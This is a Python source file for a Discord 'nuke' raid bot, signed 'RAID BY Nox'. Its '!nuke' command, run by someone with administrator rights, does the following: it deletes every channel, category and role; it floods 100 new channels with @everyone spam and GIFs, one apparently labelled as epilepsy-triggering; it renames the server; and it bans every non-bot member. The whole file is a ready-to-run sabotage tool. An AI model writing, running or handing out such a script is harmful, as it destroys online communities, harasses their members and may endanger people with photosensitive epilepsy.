import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        return

    guild = ctx.guild

    gifs = [
        "https://cdn.discordapp.com/attachments/1363575343197327500/1363581586834198528/epilepsy-god.gif",
        "https://cdn.discordapp.com/attachments/1363575343197327500/1363581587198972207/The-Purge-Season-1-Finale.gif",
        "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067522277637/images.jpg",
        "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067870535750/f4a7c1fd5f5056cbc63f948f66b187a7.gif"
    ]

    async def fast_delete(items):
        tasks = []
        for item in items:
            tasks.append(item.delete())
        await asyncio.gather(*tasks, return_exceptions=True)

    async def fast_ban(members):
        tasks = []
        for member in members:
            if not member.bot:
                tasks.append(member.ban(reason="☠️ RAID BY Nox ☠️"))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def fast_create_channels():
        for _ in range(100):
            try:
                channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                embed = discord.Embed(description="@everyone\n☠️ RAID BY Nox ☠️", color=discord.Color.red())
                embed.set_image(url=gifs[_ % len(gifs)])
                for _ in range(100):
                    asyncio.create_task(channel.send(embed=embed))
            except:
                continue

    async def fast_create_roles():
        tasks = []
        for _ in range(30):
            tasks.append(guild.create_role(name="☠️ RAID BY Nox ☠️"))
        await asyncio.gather(*tasks, return_exceptions=True)

    try:
        await fast_delete(guild.channels)
        await fast_delete(guild.categories)
        await fast_delete([r for r in guild.roles if r.name != "@everyone"])
        await fast_create_channels()
        await guild.edit(name="☠️ RAID BY Nox ☠️")
        await fast_create_roles()
        await fast_ban(guild.members)
        print("NUKE FINI")
    except Exception as e:
        print(f"Erreur : {e}")

bot.run(os.getenv("TOKEN"))
